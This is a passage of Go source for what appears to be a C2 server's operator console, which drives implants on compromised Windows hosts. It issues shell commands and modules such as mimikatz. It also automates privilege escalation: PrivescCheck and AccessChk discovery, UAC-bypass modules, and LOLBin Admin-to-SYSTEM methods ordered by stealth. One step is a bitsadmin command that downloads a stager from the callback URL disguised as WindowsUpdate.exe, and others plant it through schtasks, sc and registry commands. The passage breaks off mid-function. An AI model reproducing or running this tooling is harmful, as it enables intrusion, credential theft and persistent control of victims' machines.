							sessionTasks = append(sessionTasks, task)
						}
					}
				}
			}

			if len(sessionTasks) == 0 {
				fmt.Println("[*] No tasks for this session")
				continue
			}

			// Sort by creation time (newest first)
			sort.Slice(sessionTasks, func(i, j int) bool {
				return sessionTasks[i].CreatedAt.After(sessionTasks[j].CreatedAt)
			})

			fmt.Printf("[*] Tasks for session %s (%d total):\n\n", shortID(sessionID), len(sessionTasks))

			// Check for unsupported module types
			hasUnsupported := false
			for _, task := range sessionTasks {
				if task.Type == "module" && strings.Contains(task.Command, "csharp/") {
					hasUnsupported = true
					break
				}
			}
			if hasUnsupported {
				fmt.Println("[!] Note: C# modules are not yet supported by Go implants")
				fmt.Println("    They will fail with 'Module not available' error")
			}

			for i, task := range sessionTasks {
				statusColor := ""
				resetColor := "\033[0m"
				switch task.Status {
				case "completed":
					statusColor = "\033[32m" // Green
				case "failed", "error":
					statusColor = "\033[31m" // Red
				case "pending", "in_progress":
					statusColor = "\033[33m" // Yellow
				}

				fmt.Printf("  %d. ID: %s\n", i+1, task.ID)
				fmt.Printf("     Type: %s\n", task.Type)
				fmt.Printf("     Command: %s\n", task.Command)
				fmt.Printf("     Status: %s%s%s\n", statusColor, task.Status, resetColor)
				fmt.Printf("     Created: %s\n", task.CreatedAt.Format("2006-01-02 15:04:05"))

				// Show result preview for completed tasks
				if task.Status == "completed" && task.Result != nil {
					if resultMap, ok := task.Result.(map[string]interface{}); ok {
						if resultValue, ok := resultMap["result"].(string); ok {
							// Truncate long results
							resultPreview := resultValue
							if len(resultPreview) > 100 {
								resultPreview = resultPreview[:100] + "..."
							}
							fmt.Printf("     Result: %s\n", resultPreview)

							// Show recommendation count for privesccheck
							if task.Type == "module" && strings.Contains(task.Command, "privesccheck") {
								if _, hasRecs := resultMap["recommendations"]; hasRecs {
									fmt.Printf("     [*] Actionable recommendations available\n")
								}
							}

							fmt.Printf("     Use 'task %s' to see full output\n", task.ID)
						}
					}
				} else if task.Status == "in_progress" {
					// Check if task has been in progress for a while (might be stuck)
					elapsed := time.Since(task.CreatedAt)
					if elapsed > 30*time.Second {
						fmt.Printf("     [!] Task has been running for %v - may be stuck or failed\n", elapsed.Round(time.Second))
					}
					fmt.Printf("     Use 'task %s' to check for results\n", task.ID)
				} else if task.Status == "pending" {
					fmt.Printf("     Use 'task %s' to check status\n", task.ID)
				}
				fmt.Println()
			}

			if len(sessionTasks) > 0 {
				fmt.Println("[*] Tip: Use 'task <number>' to view results (e.g., 'task 1')")
				fmt.Println("    Results also appear automatically when tasks complete")
			}
		case "task":
			if len(args) < 1 {
				fmt.Println("[!] Error: Task ID is required")
				fmt.Println("    Usage: task <number> or task <task_id>")
				fmt.Println("    Example: task 1 (to view first task from 'tasks' list)")
				fmt.Println("    Tip: Just use the number from 'tasks' command for quick access")
				fmt.Println("    Use 'tasks' to list all tasks")
				continue
			}

			// Get all tasks for this session first
			allTasks := is.taskQueue.GetAll()
			sessionTasks := make([]*tasks.Task, 0)
			for _, task := range allTasks {
				if task.Parameters != nil {
					if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
						if taskSessionID == sessionID {
							sessionTasks = append(sessionTasks, task)
						}
					}
				}
			}

			// Sort by creation time (newest first) to match 'tasks' command order
			sort.Slice(sessionTasks, func(i, j int) bool {
				return sessionTasks[i].CreatedAt.After(sessionTasks[j].CreatedAt)
			})

			var task *tasks.Task
			taskID := args[0]

			// Check if it's a numeric ID (1-based index like modules)
			if numID, err := strconv.Atoi(taskID); err == nil {
				if numID > 0 && numID <= len(sessionTasks) {
					task = sessionTasks[numID-1] // Convert to 0-based index
					taskID = task.ID             // Update taskID to actual ID for consistency
				} else {
					fmt.Printf("[!] Invalid task number: %d (must be between 1 and %d)\n", numID, len(sessionTasks))
					fmt.Println("    Use 'tasks' to list all tasks")
					continue
				}
			} else {
				// Try to find by task ID
				task = is.taskQueue.Get(taskID)
				if task == nil {
					fmt.Printf("[!] Task not found: %s\n", taskID)
					fmt.Println("    Use 'tasks' to list all tasks")
					fmt.Println("    Note: Tasks are removed 30 seconds after completion")
					continue
				}

				// Check if task belongs to current session
				if task.Parameters != nil {
					if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
						if taskSessionID != sessionID {
							fmt.Printf("[!] Task %s belongs to a different session\n", taskID)
							continue
						}
					}
				}
			}

			fmt.Printf("[*] Task Details:\n")
			fmt.Printf("  ID: %s\n", task.ID)
			fmt.Printf("  Type: %s\n", task.Type)
			fmt.Printf("  Command: %s\n", task.Command)
			fmt.Printf("  Status: %s\n", task.Status)
			fmt.Printf("  Created: %s\n", task.CreatedAt.Format("2006-01-02 15:04:05"))

			if task.Result != nil {
				if resultMap, ok := task.Result.(map[string]interface{}); ok {
					if resultValue, ok := resultMap["result"].(string); ok {
						fmt.Printf("\n[*] Result:\n")
						fmt.Println(resultValue)

						// Post-process privesccheck results to add actionable recommendations
						if task.Type == "module" && strings.Contains(task.Command, "privesccheck") {
							is.enhancePrivescCheckResults(resultValue, taskID)
						}
					}
				}
			} else if task.Status == "pending" || task.Status == "in_progress" {
				elapsed := time.Since(task.CreatedAt)
				fmt.Printf("\n[*] Task is still %s (running for %v)\n", task.Status, elapsed.Round(time.Second))
				fmt.Println("    Results will appear here when completed.")

				// Warn about unsupported module types
				if task.Type == "module" && strings.Contains(task.Command, "csharp/") {
					fmt.Println("\n[!] Warning: C# modules are not supported by Go implants")
					fmt.Println("    This task will fail. Only PowerShell and Python modules are supported.")
				}

				// Check if task might be stuck
				if task.Status == "in_progress" && elapsed > 60*time.Second {
					fmt.Println("\n[!] This task has been running for over 60 seconds and may be stuck.")
					fmt.Println("    Check server logs or try executing a simple command to verify the session is responsive.")
				}
			} else if task.Status == "failed" || task.Status == "error" {
				fmt.Println("\n[!] Task failed or encountered an error.")
				if task.Result != nil {
					if resultMap, ok := task.Result.(map[string]interface{}); ok {
						if resultValue, ok := resultMap["result"].(string); ok {
							fmt.Println("\n[*] Error details:")
							fmt.Println(resultValue)
						}
					}
				}
			}
		case "getsystem":
			if err := is.executeGetSystem(sessionID); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "getsystemsafe":
			if err := is.executeGetSystemSafe(sessionID); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "getprivs", "whoami":
			if err := is.executeGetPrivs(sessionID); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "kill", "k":
			if err := is.executeKill(sessionID); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				// Session will be terminated, exit the shell
				is.currentSession = ""
				return nil
			}
		case "help", "h", "?":
			fmt.Println("Session commands:")
			fmt.Println("  shell <command>  - Execute shell command")
			fmt.Println("  module <id>      - Execute module")
			fmt.Println("  modules          - List available modules")
			fmt.Println("  queue            - List pending tasks")
			fmt.Println("  getsystem        - Elevate to SYSTEM privileges (Windows)")
			fmt.Println("  getsystemsafe    - Stealthy privilege escalation using LOLBins only")
			fmt.Println("  getprivs, whoami - Show current privilege level and username")
			fmt.Println("  migrate <pid>   - Migrate to another process")
			fmt.Println("  grep <pattern> <path> - Search file contents")
			fmt.Println("  head <path>      - Show first lines of file")
			fmt.Println("  tail <path>      - Show last lines of file")
			fmt.Println("  cat <path>       - Display file contents")
			fmt.Println("  download <path> - Download file")
			fmt.Println("  upload <local> <remote> - Upload file")
			fmt.Println("  kill, k          - Kill implant and exit session")
			fmt.Println("  back, exit       - Exit session")
		default:
			// Default to shell command
			_, err := is.executeShellCommand(sessionID, line)
			if err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			} else {
				// Task queued - result will be displayed automatically via events
				fmt.Printf("[*] Task queued. Result will appear automatically when ready.\n")
			}
		}
	}

	return nil
}

// startInteractiveShell starts an interactive shell session
func (is *InteractiveServer) startInteractiveShell(sessionID, shellCmd string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s", shortID(sessionID))
	}

	fmt.Printf("[*] Starting interactive %s shell...\n", shellCmd)
	fmt.Printf("[*] Type commands to execute. Type 'exit' to leave shell mode.\n\n")

	// Create shell-specific readline input
	shellPrompt := "C:\\> "
	if strings.Contains(shellCmd, "powershell") {
		shellPrompt = "PS C:\\> "
	}
	
	var shellInput interactive.InputReader
	rlInput, err := interactive.NewReadlineInput(shellPrompt)
	if err != nil {
		shellInput = interactive.NewFallbackInput(shellPrompt)
	} else {
		shellInput = rlInput
	}
	defer shellInput.Close()

	for {
		// Validate session still exists
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			fmt.Printf("[!] Session %s no longer exists\n", shortID(sessionID))
			break
		}

		line, err := shellInput.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("[!] Error reading input: %v\n", err)
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		// Exit shell mode
		if line == "exit" || line == "quit" {
			fmt.Println("[*] Exiting shell mode")
			break
		}

		// Execute command in shell context
		// For cmd.exe, wrap in cmd.exe /c
		// For powershell, wrap in powershell.exe -Command
		var cmdToExecute string
		if shellCmd == "cmd.exe" {
			cmdToExecute = fmt.Sprintf("cmd.exe /c %s", line)
		} else {
			cmdToExecute = fmt.Sprintf("powershell.exe -Command %s", line)
		}

		// Execute command
		taskID, err := is.executeShellCommand(sessionID, cmdToExecute)
		if err != nil {
			fmt.Printf("[!] Error: %v\n", err)
			continue
		}

		// Wait for result (with timeout)
		timeout := 30 * time.Second
		start := time.Now()
		ticker := time.NewTicker(200 * time.Millisecond)

		resultReceived := false
		for range ticker.C {
			task := is.taskQueue.Get(taskID)
			if task == nil {
				ticker.Stop()
				break // Task removed
			}

			if task.Status == "completed" && task.Result != nil {
				if resultMap, ok := task.Result.(map[string]interface{}); ok {
					if resultValue, ok := resultMap["result"].(string); ok {
						// Display result
						fmt.Print(resultValue)
						if !strings.HasSuffix(resultValue, "\n") {
							fmt.Println()
						}
						resultReceived = true
						ticker.Stop()
						break
					}
				}
			}

			if time.Since(start) > timeout {
				fmt.Printf("[!] Command timed out after %v\n", timeout)
				ticker.Stop()
				break
			}
		}

		if !resultReceived {
			fmt.Printf("[!] Command execution incomplete or timed out\n")
		}
	}

	return nil
}

// pollTaskResult polls for task result and displays it (with default 10s timeout)
func (is *InteractiveServer) pollTaskResult(sessionID, taskID string) {
	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
}

// waitForSessionWithPrivilege polls for a new session with the target privilege level
// Returns the session if found, nil if timeout. Uses polling instead of fixed sleep for determinism.
func (is *InteractiveServer) waitForSessionWithPrivilege(targetPriv core.PrivilegeLevel, timeout time.Duration, excludeSessionID string) *core.Session {
	deadline := time.Now().Add(timeout)
	pollInterval := 500 * time.Millisecond

	for time.Now().Before(deadline) {
		allSessions := is.sessionMgr.ListSessions()
		for _, sess := range allSessions {
			// Skip excluded session (usually the current one)
			if excludeSessionID != "" && sess.ID == excludeSessionID {
				continue
			}
			if sess.GetPrivilegeLevel() == targetPriv {
				return sess
			}
		}
		time.Sleep(pollInterval)
	}
	return nil
}

// pollTaskResultWithTimeout polls for task result and displays it with custom timeout
func (is *InteractiveServer) pollTaskResultWithTimeout(sessionID, taskID string, timeout time.Duration) {
	if is.taskQueue == nil {
		return
	}

	// Poll for result with specified timeout
	start := time.Now()
	ticker := time.NewTicker(200 * time.Millisecond) // Poll every 200ms for faster response
	defer ticker.Stop()

	// Use for-range over ticker channel, checking timeout on each iteration
	for range ticker.C {
		task := is.taskQueue.Get(taskID)
		if task == nil {
			// Task removed - may have completed or timed out
			return
		}

		if task.Status == "completed" && task.Result != nil {
			// Display result
			if resultMap, ok := task.Result.(map[string]interface{}); ok {
				if resultValue, ok := resultMap["result"].(string); ok {
					// Check for common errors and provide helpful messages
					if strings.Contains(resultValue, "Script must be run as administrator") {
						fmt.Println("[!] Privilege escalation failed: Current session is not running as Administrator")
						fmt.Println("    The 'getsystem' module requires Administrator privileges to elevate to SYSTEM")
						fmt.Println("    Use 'shell whoami /groups' to check current privileges")
						fmt.Println("    Try other privilege escalation modules if you're not admin yet")
					} else {
						fmt.Println(resultValue)
					}
				}
			}
			return
		}

		if time.Since(start) > timeout {
			fmt.Printf("[!] Task %s timed out after %v\n", taskID, timeout)
			return
		}
	}
}

func (is *InteractiveServer) executeShellCommand(sessionID, command string) (string, error) {
	if is.server == nil {
		return "", fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if command == "" {
		return "", fmt.Errorf("command cannot be empty\n" +
			"  Usage: shell <command>\n" +
			"  Example: shell whoami")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return "", fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Queue task for session
	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:      taskID,
		Type:    "shell",
		Command: command,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued command: %s (task: %s)\n", command, taskID)
	
	// Mark task as pending for auto-display when result arrives
	if is.markTaskPending != nil {
		is.markTaskPending(taskID)
	}
	
	return taskID, nil
}

func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) (string, error) {
	if is.server == nil {
		return "", fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if moduleID == "" {
		return "", fmt.Errorf("module ID cannot be empty\n" +
			"  Usage: module <module_id> [args...]\n" +
			"  Example: module powershell/credentials/mimikatz\n" +
			"  Use 'modules' command to list available modules")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return "", fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	module, ok := is.moduleRegistry.GetModule(moduleID)
	if !ok {
		// Try numeric ID lookup - check if it's a number
		if numID, err := strconv.Atoi(moduleID); err == nil {
			// It's a numeric ID - look it up in the modules list
			// Need to match the same ordering as displayed in 'modules' command
			allModules := is.moduleRegistry.ListAllModules()

			// Group by category and sort (same as modules command)
			byCategory := make(map[string][]*modules.EmpireModule)
			for _, mod := range allModules {
				category := string(mod.Category)
				byCategory[category] = append(byCategory[category], mod)
			}

			categories := make([]string, 0, len(byCategory))
			for cat := range byCategory {
				categories = append(categories, cat)
			}
			sort.Strings(categories)

			// Build ordered list matching display order
			orderedModules := make([]*modules.EmpireModule, 0, len(allModules))
			for _, category := range categories {
				mods := byCategory[category]
				// Sort modules within category by ID for consistent ordering
				sort.Slice(mods, func(i, j int) bool {
					return mods[i].ID < mods[j].ID
				})
				orderedModules = append(orderedModules, mods...)
			}

			if numID > 0 && numID <= len(orderedModules) {
				module = orderedModules[numID-1] // Convert to 0-based index
				moduleID = module.ID             // Update moduleID to the actual string ID
				ok = true
			}
		}
	}

	if !ok {
		return "", fmt.Errorf("module not found: %s\n"+
			"  Use 'modules' command to list available modules\n"+
			"  You can use either the module ID (e.g., powershell/privesc/getsystem) or numeric ID (e.g., 29)\n"+
			"  Note: Module IDs are case-sensitive", moduleID)
	}

	// Validate module exists (we already checked above)
	_ = module
	params := make(map[string]interface{})
	params["session_id"] = sessionID
	for i := 0; i < len(args); i += 2 {
		if i+1 < len(args) {
			params[args[i]] = args[i+1]
		} else {
			// Single argument without value
			params[args[i]] = ""
		}
	}

	// Queue module task
	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:         taskID,
		Type:       "module",
		Command:    moduleID,
		Parameters: params,
	}
	is.server.EnqueueTask(task)
	is.logger.Info("[MODULE] Queued module: %s (session: %s, task: %s)",
		moduleID, shortID(sessionID), taskID)
	fmt.Printf("[+] Queued module: %s (session: %s, task: %s)\n", moduleID, shortID(sessionID), taskID)
	
	// Mark task as pending for auto-display when result arrives
	if is.markTaskPending != nil {
		is.markTaskPending(taskID)
	}
	
	return taskID, nil
}

// enhancePrivescCheckResults analyzes PrivescCheck output and adds actionable recommendations
func (is *InteractiveServer) enhancePrivescCheckResults(output string, taskID string) {
	if is.privescIntelligence == nil {
		return
	}

	// Determine if current user is admin from the output
	isAdmin := is.privescIntelligence.DetermineUserLevel(output)

	// Analyze the output and get recommendations
	recommendations, err := is.privescIntelligence.AnalyzePrivescCheckOutput(output, isAdmin)
	if err != nil {
		is.logger.Debug("Failed to analyze PrivescCheck output: %v", err)
		return
	}

	if len(recommendations) > 0 {
		// Format and display recommendations
		formatted := is.privescIntelligence.FormatRecommendations(recommendations)
		fmt.Println(formatted)

		// Also update the task result to include recommendations
		if task := is.taskQueue.Get(taskID); task != nil && task.Result != nil {
			if resultMap, ok := task.Result.(map[string]interface{}); ok {
				// Add recommendations to the result
				if resultValue, ok := resultMap["result"].(string); ok {
					enhancedResult := resultValue + "\n" + formatted
					resultMap["result"] = enhancedResult
					resultMap["recommendations"] = recommendations
					is.taskQueue.SetResult(taskID, resultMap)
				}
			}
		}
	}
}

func (is *InteractiveServer) executeGetSystem(sessionID string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	// Validate session exists
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Check if Windows session
	transportType := session.Transport
	if transportType != "http" && transportType != "https" {
		// Try to determine from metadata
		if osInfo, ok := session.GetMetadata("os"); ok {
			if osStr, ok := osInfo.(string); ok {
				if !strings.Contains(strings.ToLower(osStr), "windows") {
					return fmt.Errorf("getsystem is only supported on Windows")
				}
			}
		}
	}

	fmt.Printf("[*] Starting automated privilege escalation chain...\n")
	fmt.Printf("[*] Step 1: Detecting current privilege level...\n")

	// Step 1: Detect current privilege level
	currentPriv, username, err := is.detectPrivilegeLevel(sessionID)
	if err != nil {
		return fmt.Errorf("failed to detect privilege level: %v", err)
	}

	// Update session with detected info
	if username != "" {
		session.SetUsername(username)
		session.SetPrivilegeLevel(currentPriv)
		session.SetMetadata("username", username)
		session.SetMetadata("privilege_level", string(currentPriv))
	}

	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)

	// Step 1.5: Run AccessChk discovery (if available) for pre-escalation intelligence
	var accessChkMatches []privesc.ModuleMatch
	fmt.Printf("[*] Step 1.5: Running AccessChk permission discovery...\n")
	accessChkOutput, err := is.executeAccessChk(sessionID)
	if err == nil && accessChkOutput != "" {
		fmt.Printf("[+] AccessChk discovery completed\n")
		// Analyze AccessChk output
		matches, err := is.privescIntelligence.AnalyzeAccessChkOutput(accessChkOutput)
		if err == nil && len(matches) > 0 {
			fmt.Printf("[+] Found %d exploitable permissions via AccessChk\n", len(matches))
			accessChkMatches = matches
			// Log high-confidence findings
			for _, match := range matches {
				if match.Confidence == "High" {
					fmt.Printf("    [HIGH] %s: %s\n", match.Name, match.Reason)
				}
			}
		}
	} else {
		fmt.Printf("[!] AccessChk not available or failed - continuing with PrivescCheck only\n")
	}

	// Step 2: If user, try to escalate to admin first
	if currentPriv == core.PrivilegeUser {
		fmt.Printf("[*] Step 2: Current user -> Admin escalation needed\n")
		fmt.Printf("[*] Running PrivescCheck to identify exploitable vulnerabilities...\n")

		// Run PrivescCheck
		privescCheckTaskID, err := is.executeModule(sessionID, "powershell/privesc/privesccheck", []string{})
		if err != nil {
			return fmt.Errorf("failed to run PrivescCheck: %v", err)
		}

		// Wait for PrivescCheck to complete
		fmt.Printf("[*] Waiting for PrivescCheck to complete (task: %s)...\n", privescCheckTaskID)
		is.pollTaskResultWithTimeout(sessionID, privescCheckTaskID, 120*time.Second)

		// Get PrivescCheck results
		privescCheckTask := is.taskQueue.Get(privescCheckTaskID)
		if privescCheckTask == nil || privescCheckTask.Status != "completed" {
			return fmt.Errorf("PrivescCheck failed or timed out")
		}

		var privescCheckOutput string
		if privescCheckTask.Result != nil {
			if resultMap, ok := privescCheckTask.Result.(map[string]interface{}); ok {
				if resultValue, ok := resultMap["result"].(string); ok {
					privescCheckOutput = resultValue
				}
			}
		}

		if privescCheckOutput == "" {
			return fmt.Errorf("PrivescCheck returned no output")
		}

		// Analyze results and get recommendations
		isAdmin := is.privescIntelligence.DetermineUserLevel(privescCheckOutput)
		recommendations, err := is.privescIntelligence.AnalyzePrivescCheckOutput(privescCheckOutput, isAdmin)
		if err != nil {
			return fmt.Errorf("failed to analyze PrivescCheck output: %v", err)
		}

		// Find User->Admin modules to try
		userToAdminModules := make([]privesc.ModuleMatch, 0)
		for _, rec := range recommendations {
			for _, match := range rec.AvailableModules {
				if match.EscalationType == "User->Admin" {
					userToAdminModules = append(userToAdminModules, match)
				}
			}
		}

		// Merge AccessChk findings with PrivescCheck recommendations
		// Prioritize AccessChk findings (they're more specific)
		for _, match := range accessChkMatches {
			if match.EscalationType == "User->Admin" {
				// Check if not already in list
				found := false
				for _, existing := range userToAdminModules {
					if existing.ModuleID == match.ModuleID && existing.Reason == match.Reason {
						found = true
						break
					}
				}
				if !found {
					userToAdminModules = append(userToAdminModules, match)
					fmt.Printf("[+] Added AccessChk finding: %s (%s)\n", match.Name, match.Reason)
				}
			}
		}

		if len(userToAdminModules) == 0 {
			return fmt.Errorf("no User->Admin escalation opportunities found by PrivescCheck")
		}

		// Try modules in order of confidence (High -> Medium -> Low)
		sort.Slice(userToAdminModules, func(i, j int) bool {
			confMap := map[string]int{"High": 3, "Medium": 2, "Low": 1}
			return confMap[userToAdminModules[i].Confidence] > confMap[userToAdminModules[j].Confidence]
		})

		fmt.Printf("[*] Found %d User->Admin escalation opportunities\n", len(userToAdminModules))
		fmt.Printf("[*] Attempting escalation modules in order of confidence...\n")

		escalatedToAdmin := false
		for i, match := range userToAdminModules {
			fmt.Printf("[*] Trying module %d/%d: %s (%s confidence)\n", i+1, len(userToAdminModules), match.ModuleID, match.Confidence)
			fmt.Printf("    Reason: %s\n", match.Reason)

			// Execute the module
			moduleTaskID, err := is.executeModule(sessionID, match.ModuleID, []string{})
			if err != nil {
				fmt.Printf("[!] Failed to queue module %s: %v\n", match.ModuleID, err)
				continue
			}

			// Wait for completion (60 seconds for UAC bypass modules)
			is.pollTaskResultWithTimeout(sessionID, moduleTaskID, 60*time.Second)

			// Check if escalation succeeded by detecting new privilege level
			time.Sleep(2 * time.Second) // Give session time to update
			newPriv, _, err := is.detectPrivilegeLevel(sessionID)
			if err == nil && newPriv == core.PrivilegeAdmin {
				fmt.Printf("[+] Successfully escalated to Admin using %s!\n", match.ModuleID)
				session.SetPrivilegeLevel(core.PrivilegeAdmin)
				session.SetMetadata("privilege_level", "admin")
				escalatedToAdmin = true
				currentPriv = core.PrivilegeAdmin
				break
			}
		}

		if !escalatedToAdmin {
			return fmt.Errorf("failed to escalate from User to Admin: all %d attempts failed", len(userToAdminModules))
		}
	}

	// Step 3: If admin, escalate to SYSTEM using LOLBins
	if currentPriv == core.PrivilegeAdmin {
		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation (using LOLBins)...\n")

		lolbinEsc := &privesc.LOLBinEscalation{}
		methods := lolbinEsc.GetAdminToSystemMethods()
		// Sort by noise level (Low first)
		sort.Slice(methods, func(i, j int) bool {
			noiseMap := map[string]int{"Low": 1, "Medium": 2, "High": 3}
			return noiseMap[methods[i].NoiseLevel] < noiseMap[methods[j].NoiseLevel]
		})

		escalatedToSystem := false
		for i, method := range methods {
			fmt.Printf("[*] Trying method %d/%d: %s (Noise: %s)\n", i+1, len(methods), method.Name, method.NoiseLevel)

			// Get callback URL for spawn command
			callbackURL := is.getCallbackURL(session)
			if callbackURL == "" {
				return fmt.Errorf("could not determine callback URL")
			}

			// Generate spawn command using LOLBins
			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
			// Escape % signs in spawnCmd so fmt.Sprintf doesn't interpret them
			spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)

			// Execute method commands with proper timing and error checking
			commandFailed := false
			for idx, cmdTemplate := range method.Commands {
				// Detect what type of command this is and handle accordingly
				var cmd string

				// Check if this is a copy command that needs a file path
				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) &&
					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) ||
						strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))

				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)

				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)

				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))

				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)

				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath

				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)

				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)

				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)

				if isCopyCommand {
					// For copy commands, we need to download the file first, then copy it
					hasDownloaded := false
					for j := 0; j < idx; j++ {
						if strings.Contains(method.Commands[j], `bitsadmin`) || strings.Contains(method.Commands[j], `download`) {
							hasDownloaded = true
							break
						}
					}

					if !hasDownloaded {
						// First copy command - download the file first
						filePath := `%TEMP%\WindowsUpdate.exe`
						// Download the file
						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
						downloadTask := &tasks.Task{
							ID:         downloadTaskID,
							Type:       "shell",
							Command:    downloadCmd,
							Parameters: map[string]interface{}{"session_id": sessionID},
						}
						is.server.EnqueueTask(downloadTask)
						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
					}

					// Now use the file path for the copy command
					filePath := `%TEMP%\WindowsUpdate.exe`
					// Extract destination from template
					cmd = fmt.Sprintf(cmdTemplate, filePath)
				} else if isDelCommand {
					// For del commands, use template as-is (no %s placeholder)
					if strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `Program Files`) {
						cmd = cmdTemplate // Template already has correct path
					} else {
						filePath := `%TEMP%\WindowsUpdate.exe`
						cmd = fmt.Sprintf(cmdTemplate, filePath)
					}
				} else if isSchTasksTr {
					// For schtasks /tr, we need to pass the command directly without cmd.exe /c wrapper
					// schtasks interprets /c as its own option if we wrap it
					spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
					spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
					// Escape quotes for nested command
					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isSchTasksXml {
					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
					commandFailed = true
					break
				} else if isRegAddD {
					// For reg add /d, we need to escape quotes properly
					// reg add expects the value to be in quotes, so we escape internal quotes
					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isRegImagePath {
					// For reg add ImagePath, wrap in cmd.exe /c
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isScCreate || isScConfig {
					// For sc create/config binPath=, we need to escape quotes properly
					// sc config expects binPath= "path" format, so we escape internal quotes
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					// Escape quotes - need to escape \" for Windows
					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
				} else if isWmic {
					// For wmic, wrap in cmd.exe /c
					// Some WMI commands have multiple %s placeholders (e.g., CommandLineEventConsumer)
					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
					// Count %s placeholders
					placeholderCount := strings.Count(cmdTemplate, `%s`)
					if placeholderCount == 2 {
						// Two placeholders - use same command for both
						cmd = strings.Replace(cmdTemplate, `%s`, spawnCmdForExecEscaped, 2)
					} else {
						cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
					}
				} else {
					// For other commands, check if template has %s placeholder
					if strings.Contains(cmdTemplate, `%s`) {
						cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
					} else {
						// Template doesn't have %s, use as-is (may have %% for environment variables)
						cmd = cmdTemplate
					}
				}

				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
				task := &tasks.Task{
					ID:         taskID,
					Type:       "shell",
					Command:    cmd,
